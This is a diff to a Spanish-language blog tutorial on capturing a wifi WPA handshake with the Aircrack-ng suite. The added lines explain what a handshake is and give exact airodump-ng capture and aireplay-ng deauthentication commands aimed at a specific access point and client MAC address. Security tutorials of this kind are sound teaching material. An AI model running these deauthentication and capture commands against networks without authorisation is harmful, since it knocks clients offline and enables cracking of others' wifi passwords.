@@ -16,7 +16,9 @@ tags:
 
 ---
 
-En este post te enseñaré a capturar un handshake de una red wifi utilizando la suite Aircrak-ng.
+En este post te enseñaré a capturar un handshake de una red wifi utilizando la suite Aircrak-ng con el metodo de desautenticación.
+
+Un handshake es una petición entre un cliente y un punto de acceso para establecer una conexión. Cuando capturamos un Handshake, no se captura la contraseña, sino una serie de parámetros, donde está la contraseña Wifi pero cifrada.
 
 
 ## Antes de empezar
@@ -192,6 +194,14 @@ BSSID STATION PWR Rate Lost Frames Notes Probes
 
 1C:B0:44:4C:CD:2F 28:16:7F:6D:4C:2C -45 0 - 1e 141 23
 ```
-Ahora sí, vemos que hay un cliente '28:16:7F:6D:4C:2C' conectado al punto de acceso
+Ahora sí, vemos que hay un cliente `28:16:7F:6D:4C:2C` conectado al punto de acceso
 
-Con esto ya tendriamos todos los datos que necesitamos para la captura del handshake
+Con esto ya tendríamos todos los datos que necesitamos para la captura del handshake
+
+## A la espera de un handshake
+Para la captura nos vamos a poner en escucha a la espera de capturar un handshake.
+Abrimos una nueva ventana y ejecutamos este comando `sudo airodump-ng -w test1 -c 1 --bssid 1C:B0:44:4C:CD:2F wlx00c0caab5835`
+
+
+## Ataque de desautenticación
+En otra ventana ejecutamos el comando `sudo aireplay-ng -0 1 -a 1C:B0:44:4C:CD:2F -c 28:16:7F:6D:4C:2C wlx00c0caab5835`
